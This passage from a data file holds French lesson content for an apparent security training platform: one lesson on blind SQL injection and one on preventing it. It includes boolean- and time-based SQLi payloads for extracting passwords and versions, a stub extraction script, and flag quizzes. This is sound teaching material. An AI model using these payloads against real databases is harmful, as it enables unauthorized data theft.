- Extraire les données sensibles avec UNION SELECT
`,
  },
  {
    id: 'blind-sqli',
    slug: 'blind-sqli',
    moduleSlug: 'sql-injection',
    title: 'Blind SQLi',
    description: 'Exploiter l\'injection SQL aveugle (boolean-based et time-based) quand aucune donnée n\'est retournée.',
    xpReward: 200,
    order: 3,
    content: `# Blind SQLi

## Objectif
Comprendre et exploiter l'injection SQL aveugle (Blind SQLi) quand l'application ne retourne pas les résultats de la requête SQL.

## Théorie

### Qu'est-ce que le Blind SQLi ?
Dans une Blind SQLi, l'application **ne retourne pas les résultats** de la requête SQL ni les messages d'erreur. L'attaquant doit déduire l'information en observant le comportement de l'application (vrai/faux, temps de réponse).

### Types de Blind SQLi

#### 1. Boolean-based Blind SQLi
L'attaquant envoie une payload qui force la requête à retourner VRAI ou FAUX, et observe les différences dans la réponse.

\`\`\`sql
-- Si l'ID existe, la page affiche "Produit trouvé", sinon "Produit inexistant"
SELECT * FROM products WHERE id = 1 AND 1=1; -- Vrai : page normale
SELECT * FROM products WHERE id = 1 AND 1=2; -- Faux : page différente ou vide
\`\`\`

\`\`\`sql
-- Extraire un caractère de la version
SELECT * FROM products WHERE id = 1 AND SUBSTRING(@@version, 1, 1) = '5';
-- Si la version commence par 5, la page s'affiche normalement
\`\`\`

#### 2. Time-based Blind SQLi
L'attaquant utilise des fonctions de délai (ex: \`SLEEP()\`, \`BENCHMARK()\`) pour inférer l'information via le temps de réponse.

\`\`\`sql
-- Si la condition est vraie, la réponse prend 5 secondes
SELECT * FROM products WHERE id = 1 AND IF(1=1, SLEEP(5), 0);
-- Si faux, réponse immédiate
\`\`\`

\`\`\`sql
-- Extraire un caractère via le temps
SELECT * FROM products WHERE id = 1 AND IF(SUBSTRING(@@version, 1, 1) = '5', SLEEP(5), 0);
\`\`\`

### Techniques d'Extraction

\`\`\`sql
-- Extraire la longueur d'un mot de passe
1' AND LENGTH(password) > 10 --

-- Extraire caractère par caractère
1' AND SUBSTRING(password, 1, 1) = 'a' --
1' AND SUBSTRING(password, 2, 1) = 'b' --

-- Avec time-based
1' AND IF(SUBSTRING(password, 1, 1) = 'a', SLEEP(5), 0) --
\`\`\`

### Automatisation
Le Blind SQLi est lent (caractère par caractère). Utilisez des outils comme **SQLMap** ou écrivez un script.

\`\`\`python
import requests
import time

def test_char(position, char):
    payload = f"1' AND SUBSTRING(password, {position}, 1) = '{char}' --"
    # Envoyer la requête et vérifier la réponse
    # Si la page contient "Produit trouvé", le caractère est correct
\`\`\`

## Exemple

\`\`\`sql
-- Application vulnérable (pas de retour de données, juste "OK" ou "Erreur")
SELECT * FROM users WHERE id = 1;

-- Boolean-based : vérifier si l'utilisateur admin existe
1' AND (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0 --

-- Si la page affiche "OK", admin existe. Sinon, non.

-- Time-based : extraire la version caractère par caractère
1' AND IF(SUBSTRING(@@version, 1, 1) = '5', SLEEP(3), 0) --
-- Si la réponse prend > 3s, le premier caractère est '5'
\`\`\`

## Exercice
Quelle fonction SQL est couramment utilisée dans les injections time-based pour introduire un délai ?

## Flag
Quel type d'injection SQL utilise des délais (delays) pour inférer l'information ?

**Format :** \`FLAG{type}\` (exemple : \`FLAG{time-based}\`)

## Récap
- Blind SQLi : pas de retour direct des données ni d'erreurs
- Boolean-based : observer les différences de réponse (vrai/faux)
- Time-based : observer le temps de réponse avec SLEEP()
- Extraction lente (caractère par caractère) nécessitant l'automatisation
`,
  },
  {
    id: 'sqli-prevention',
    slug: 'sqli-prevention',
    moduleSlug: 'sql-injection',
    title: 'Prévention SQLi',
    description: 'Apprendre les techniques de prévention : prepared statements, ORM, validation et bonnes pratiques.',
    xpReward: 200,
    order: 4,
    content: `# Prévention SQLi

## Objectif
Maîtriser les techniques de prévention des injections SQL : prepared statements, ORM, validation et bonnes pratiques.

## Théorie

### 1. Prepared Statements (Requêtes Paramétrées)
La méthode **la plus efficace** et recommandée. Les paramètres sont envoyés séparément de la requête SQL, donc l'entrée utilisateur n'est jamais interprétée comme du code SQL.

\`\`\`javascript
// ❌ Mauvais : concaténation (vulnérable)
const query = \`SELECT * FROM users WHERE username = '\${username}'\`;
db.query(query);

// ✅ Bon : prepared statement (sécurisé)
const query = 'SELECT * FROM users WHERE username = ?';
db.query(query, [username]);
\`\`\`

\`\`\`php
// ❌ Mauvais
$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($conn, $query);

// ✅ Bon
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
\`\`\`

\`\`\`python
# ❌ Mauvais
cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")

# ✅ Bon
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
\`\`\`

### 2. Utilisation d'un ORM (Object-Relational Mapping)
Les ORM génèrent automatiquement des requêtes sécurisées.

\`\`\`javascript
// Sequelize (Node.js)
const users = await User.findAll({
  where: { username: username } // Sécurisé par défaut
});

// Prisma (Node.js)
const user = await prisma.user.findUnique({
  where: { username: username }
});
\`\`\`

\`\`\`python
# Django ORM
user = User.objects.get(username=username)  # Sécurisé
\`\`\`

### 3. Validation et Sanitization
Valider que l'entrée correspond au format attendu (whitelist).

\`\`\`javascript
// Validation d'un ID numérique
function validateId(input) {
  return /^\d+$/.test(input);
}
if (!validateId(userId)) {
  throw new Error('Invalid ID');
}
\`\`\`

### 4. Principe du Moindre Privilège
- L'application doit utiliser un utilisateur de base de données avec **les permissions minimales nécessaires**
- Pas d'accès \`DROP TABLE\`, \`DELETE\` si non nécessaire
- Utiliser des comptes différents pour lecture et écriture

### 5. Autres Mesures de Défense
- **WAF (Web Application Firewall)** : Filtre les payloads SQLi connus (ex: Cloudflare, ModSecurity)
- **Désactiver les erreurs SQL détaillées** en production
- **Utiliser des procédures stockées** (avec paramètres) si possible
- **Échapper les entrées** (seulement si les prepared statements ne sont pas possibles, moins sûr)

\`\`\`javascript
// Échappement (moins sûr que prepared statements)
import mysql from 'mysql';
const safeUsername = mysql.escape(username);
const query = \`SELECT * FROM users WHERE username = \${safeUsername}\`;
\`\`\`

## Exemple

\`\`\`javascript
// Application Express + MySQL sécurisée
const express = require('express');
const mysql = require('mysql2/promise');
const app = express();

// Pool de connexions
const pool = mysql.createPool({
  host: 'localhost',
  user: 'app_user', // Utilisateur avec privilèges limités
  password: 'password',
  database: 'app_db',
  waitForConnections: true,
});

// Route de login sécurisée
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  // Validation basique
  if (!/^[a-zA-Z0-9_]{3,20}$/.test(username)) {
    return res.status(400).json({ error: 'Invalid username' });
  }
  
  // Prepared statement
  const [rows] = await pool.execute(
    'SELECT * FROM users WHERE username = ? AND password = ?',
    [username, hashPassword(password)] // Hash du mot de passe !
  );
  
  if (rows.length > 0) {
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
\`\`\`

## Exercice
Rédigez une requête SQL sécurisée avec prepared statement pour rechercher un utilisateur par email.

## Flag
Quel terme désigne les requêtes où les paramètres sont envoyés séparément du code SQL pour prévenir l'injection ?

**Format :** \`FLAG{terme}\` (exemple : \`FLAG{prepared-statements}\`)

## Récap
- **Prepared statements** : méthode la plus efficace (paramètres séparés)
- **ORM** : génère des requêtes sécurisées automatiquement
- **Validation** : whitelist des entrées
- **Moindre privilège** : limiter les permissions DB
- Défense en profondeur : combiner plusieurs approches
`,
  },
];
